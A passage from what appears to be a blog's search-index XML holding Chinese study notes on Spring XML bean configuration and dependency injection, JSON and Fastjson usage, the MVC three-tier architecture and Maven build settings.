的全限定名称</p></li><li><p>scope：对象的作用范围，</p><ul><li><p>singleton（默认）：单例的</p><p>实例化个数：1 个</p><p>实例化时机：Spring 核心文件被加载时，实例化配置的 Bean 实例</p><p>生命周期：</p><ul><li>对象创建：当应用加载，创建容器时，对象就被创建了</li><li>对象运行：只要容器在，对象就一直存活</li><li>对象销毁：当应用卸载，销毁容器时，对象被销毁</li></ul></li><li><p>prototype：多例的</p><p>实例化个数：多个</p><p>实例化时机：调用 getBean()方法时</p><p>生命周期：</p><ul><li>对象创建：使用对象时，创建新的对象实例</li><li>对象运行 ：只要对象在使用中，就一直存活</li><li>对象销毁：当对象长时间不用时，被 java 的垃圾回收器回收</li></ul></li><li><p>request：WEB 项目中，Spring 创建一个 Bean 的对象，将对象存入到 request 域中</p></li><li><p>session：WEB 项目中，Spring 创建一个 Bean 的对象，将对象存入到 request 域中</p></li><li><p>global session：WEB 项目中，应用在 Portlet 环境，如果没有 Portlet 环境那么 globalSession 相当于 session</p></li></ul></li><li><p>init-method：指定类中的初始化方法名称</p></li><li><p>destroy-method：指定类中的销毁方法名称</p></li><li><p>子标签<code>&lt;prorerty&gt;</code>：属性注入</p><ul><li>name 属性：属性名称</li><li>value 属性：注入普通属性值</li><li>ref 属性：注入对象引用值</li><li><code>&lt;list&gt;</code></li><li><code>&lt;map&gt;</code></li><li><code>&lt;properties&gt;</code></li><li><code>&lt;contructor&gt;</code></li></ul></li></ul><h4 id="bean-实例化三种方式"><a href="#bean-实例化三种方式" class="headerlink" title="bean 实例化三种方式"></a>bean 实例化三种方式</h4><ul><li><p>无参构造方法实例化</p><p>它会根据默认无参构造方法来创建了类对象，如果 bean 中没有默认无参构造，将会创建失败</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>工厂静态方法实例化</p><pre class="line-numbers language-none"><code class="language-none">public class StaticFactoryBean &#123;    public static UserDao createUserDao()&#123;        return new UserDaoImpl();    &#125;&#125;&lt;bean id&#x3D;&quot;userDao&quot; class&#x3D;&quot;com.example.factory.StaticFactoryBean&quot; factory-method&#x3D;&quot;createUserDao&quot; &#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>工厂实例方法实例化</p><pre class="line-numbers language-none"><code class="language-none">public class DynamicFactoryBean &#123;    public UserDao createUserDao()&#123;        return new UserDaoImpl();    &#125;&#125;&lt;bean id&#x3D;&quot;factoryBean&quot; class&#x3D;&quot;com.example.factory.DynamicFactoryBean&quot;&#x2F;&gt;&lt;bean id&#x3D;&quot;userDao&quot; factory-bean&#x3D;&quot;factoryBean&quot; factory-method&#x3D;&quot;createUserDao&quot;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="bean-的依赖注入"><a href="#bean-的依赖注入" class="headerlink" title="bean 的依赖注入"></a>bean 的依赖注入</h4><p><strong>依赖注入（Dependency Injection）</strong>：它是 Spring 框架核心 IOC 的具体实现</p><p>在编写程序时，通过控制反转，把对象的创建交给了 Spring，但是代码中不可能出现没有依赖的情况。<br>IOC 解耦只是降低他们的依赖关系，但不会消除。<br>例如：业务层仍会调用持久层的方法。<br>那这种业务层和持久层的依赖关系，在使用 Spring 之后，就让 Spring 来维护了。<br>简单的说，就是坐等框架把持久层对象传入业务层，而不用我们自己去获取。</p><h5 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h5><ul><li><p><strong>set 方法注入（*）</strong></p><ol><li><p>首先需要有 setXXX()方法</p></li><li><p>配置 Spring 容器调用 set 方法进行注入</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.service.impl.UserServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>或者可以使用 P 命名空间引入，本质上也是 set 方法引入，但是更加方便</p><ol><li><p>引入 P 命名空间</p><p><code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code></p></li><li><p>修改注入方式</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.service.impl.UserServiceImpl<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">p:</span>userDao-ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li><li><p><strong>构造方法注入</strong></p><ol><li><p>提供有参构造</p></li><li><p>配置 xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userService<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.service.impl.UserServiceImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ul><h5 id="注入数据的三种数据类型"><a href="#注入数据的三种数据类型" class="headerlink" title="注入数据的三种数据类型"></a>注入数据的三种数据类型</h5><ul><li><p>普通数据类型</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>age<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>15<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>引用数据类型</p></li><li><p>集合数据类型</p><ul><li><p>List 的注入</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!-- String类型的元素--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>strList<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>bbb<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>ccc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span>    <span class="token comment">&lt;!--User类型元素--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userList<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ref</span> <span class="token attr-name">bean</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ref</span><span class="token punctuation">></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ref</span> <span class="token attr-name">bean</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ref</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Map</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example.dao.impl.UserDaoImpl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>userMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>map</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user1<span class="token punctuation">"</span></span> <span class="token attr-name">value-ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>u1<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entry</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user2<span class="token punctuation">"</span></span> <span class="token attr-name">value-ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>u2<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>map</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>properties</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>properties<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>props</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ppp1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prop</span> <span class="token attr-name">key</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>p2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>ppp2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prop</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>props</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><h3 id="引入其他配置文件"><a href="#引入其他配置文件" class="headerlink" title="引入其他配置文件"></a>引入其他配置文件</h3><p>实际开发中，Spring 的配置内容非常多，这就导致 Spring 配置很繁杂且体积很大，所以，可以将部分配置拆解到其他配置文件中，而在 Spring 主配置文件通过 import 标签进行加载</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>import</span> <span class="token attr-name">resource</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>applicationContext-xxx.xml<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="加载-properties-配置文件"><a href="#加载-properties-配置文件" class="headerlink" title="加载 properties 配置文件"></a>加载 properties 配置文件</h3><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xx.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;key&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="相关-API"><a href="#相关-API" class="headerlink" title="相关 API"></a>相关 API</h3><ul><li><p>源码</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>    <span class="token function">assertBeanFactoryActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token class-name">T</span> <span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> requiredType<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">BeansException</span> <span class="token punctuation">&#123;</span>    <span class="token function">assertBeanFactoryActive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span>requiredType<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中，当参数的数据类型是字符串时，表示根据 Bean 的 id 从容器中获得 Bean 实例，返回是 Object，需要强转。<br>当参数的数据类型是 Class 类型时，表示根据类型从容器中匹配 Bean 实例，当容器中相同类型的 Bean 有多个时，<br>则此方法会报错。</p></li><li><p>使用</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ApplicationContext</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClasspathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"xml文件"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>json</title>
      <link href="/2022/03/13/json/"/>
      <url>/2022/03/13/json/</url>
      
        <content type="html"><![CDATA[<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><p>定义</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">var variable = <span class="token punctuation">&#123;</span><span class="token property">"key1"</span><span class="token operator">:</span>value1<span class="token punctuation">,</span>                <span class="token property">"key2"</span><span class="token operator">:</span>value2<span class="token punctuation">,</span>                ……<span class="token punctuation">&#125;</span>;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>示例：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">var json = <span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"zhangsan"</span><span class="token punctuation">,</span>            <span class="token property">"age"</span><span class="token operator">:</span><span class="token number">23</span><span class="token punctuation">,</span>            <span class="token property">"addr"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"北京"</span><span class="token punctuation">,</span><span class="token string">"上海"</span><span class="token punctuation">,</span><span class="token string">"西安"</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="value-的数据类型："><a href="#value-的数据类型：" class="headerlink" title="value 的数据类型："></a>value 的数据类型：</h2><ul><li>数字（整数或浮点数）</li><li>字符串（在双引号中）</li><li>bool 值（true&#x2F;false）</li><li>数组（方括号中）</li><li>对象（大括号中）</li><li>null</li></ul><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><p>格式：变量名.key</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">json.name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="json-数据和-java-对象转换"><a href="#json-数据和-java-对象转换" class="headerlink" title="json 数据和 java 对象转换"></a>json 数据和 java 对象转换</h2><ul><li><p>Fastjson 是阿里巴巴提供的一个 JAVA 语言编写的高性能功能完善的 json 库，是目前 java 语言中最快的 json 库，可以实现 java 对象和 json 字符串的相互转换</p></li><li><p>使用</p><ol><li><p>导入 maven 坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>1.2.79<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>java 对象转 json</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonStr <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">toJSONString</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>json 字符串转 Java 对象</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">User</span> user <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonStr<span class="token punctuation">,</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MVC模式</title>
      <link href="/2022/03/12/MVC%E6%A8%A1%E5%BC%8F/"/>
      <url>/2022/03/12/MVC%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>MVC是一种分层开发的模式：</p><ul><li>M：Model，业务模型，处理业务</li><li>V：view，视图，界面展示</li><li>C：Controller，控制器，处理请求，调用模型和视图</li></ul><h2 id="三层架构"><a href="#三层架构" class="headerlink" title="三层架构"></a>三层架构</h2><ul><li><p>表现层  com.example.web&#x2F;controller</p><p>接收请求，封装数据，调用业务逻辑层，响应数据</p><ul><li>Controller控制器—&gt;view视图</li></ul></li><li><p>业务逻辑层  com.example.service</p><p>对业余逻辑进行封装，组合数据访问层中基本功能，形成复杂的业务逻辑功能</p><ul><li>注册—&gt;selectByName&amp;&amp;insert</li></ul></li><li><p>数据访问层（持久层） com.example.dao&#x2F;mapper</p><p>对数据库的CRUD基本操作</p><ul><li>selectAll</li><li>selectByName</li><li>insert</li><li>update</li><li>delete</li></ul></li></ul><p>浏览器&lt;—-&gt;表现层&lt;–&gt;业务逻辑层&lt;–&gt;数据访问层&lt;–&gt;DB</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>maven重要配置</title>
      <link href="/2022/03/12/maven%E9%85%8D%E7%BD%AE/"/>
      <url>/2022/03/12/maven%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>properties</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project.build.sourceEncoding</span><span class="token punctuation">></span></span>UTF-8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project.build.sourceEncoding</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.source</span><span class="token punctuation">></span></span>11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.source</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>maven.compiler.target</span><span class="token punctuation">></span></span>11<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>maven.compiler.target</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>properties</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>plugin</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.maven.plugins<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>maven-war-plugin<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>plugin</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BeanUtils工具类</title>
      <link href="/2022/03/09/BeanUtils%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
      <url>/2022/03/09/BeanUtils%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
      
